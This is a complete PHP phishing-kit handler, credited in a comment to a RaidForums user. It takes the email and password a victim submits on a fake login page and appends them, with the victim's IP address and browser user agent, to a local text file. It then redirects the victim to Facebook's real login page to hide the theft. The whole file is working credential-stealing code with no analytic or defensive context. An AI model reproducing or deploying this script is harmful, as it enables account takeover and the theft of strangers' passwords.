<?php
	extract($_REQUEST);
	$file=fopen("10223.txt","a");

	$line = date("$_SERVER[REMOTE_ADDR]");
	$device = $_SERVER['HTTP_USER_AGENT'];

	fwrite($file,"IP Address : ");
	fwrite($file, $line ."\n");
	fwrite($file,"User Agent : ");
	fwrite($file, $device ."\n");
	fwrite($file,"Email : ");
	fwrite($file, $email ."\n");
	fwrite($file,"Password : ");
	fwrite($file, $pass ."\n");
	fwrite($file,"-------------------------"."\n");
	fclose($file);
	header("Location: http://facebook.com/login");
	die();
	/*Coded by EVENT HORIZON on RAIDFORUMS https://raidforums.com/User-Event-Horizon */
?>